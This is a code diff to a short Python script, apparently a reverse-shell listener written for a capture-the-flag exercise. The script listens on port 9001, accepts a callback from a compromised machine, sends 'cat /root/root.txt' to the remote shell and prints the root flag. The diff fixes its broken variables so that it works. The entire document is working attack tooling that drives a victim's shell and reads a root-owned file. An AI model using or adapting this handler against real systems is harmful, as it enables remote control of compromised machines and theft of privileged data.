@@ -1,4 +1,5 @@
 import socket
+from time import sleep
 
 class Revsh(object):
     
@@ -6,27 +7,25 @@ class Revsh(object):
         self.host = "0.0.0.0"
         self.port = 9001
         self.buffer_size = 1024 * 512
-        s = socket.socket()
+        self.s = socket.socket()
+        
+        self.s.bind((self.host, self.port))
+        self.s.listen(15)
 
-        s.bind((self.host, self.port))
-
-        s.listen(5)
-        print(f"Listening as {self.host}:{self.port} ...")
-
-        self.client_socket, self.client_address = s.accept()
-        print(f"{client_address[0]}:{client_address[1]} Connected!")
-
+        self.client_socket, self.client_address = self.s.accept()
         
     def send_command(self):
-        # get the command from prompt
-        command = "cat root.txt"
-        # send the command to the client
+        self.client_socket.send(b"\n")
+        _ = self.client_socket.recv(self.buffer_size).decode()
+        command = "cat /root/root.txt"
         self.client_socket.send(command.encode('utf-8') + b"\n")
-        # retrieve command results
-        output = client_socket.recv(BUFFER_SIZE).decode()
-        # split command output and current directory
-        # results, cwd = output.split(SEPARATOR)
-        # print output
-        print(output)
-
+        _ = self.client_socket.recv(self.buffer_size).decode()
+        self.client_socket.send(b"\n")
         
+        output = self.client_socket.recv(self.buffer_size).decode()
+        flag = output.split("\n")[1]
+        print(f"Root flag: {flag}")
+        
+if __name__ == "__main__":
+     revsh = Revsh()
+     revsh.send_command()
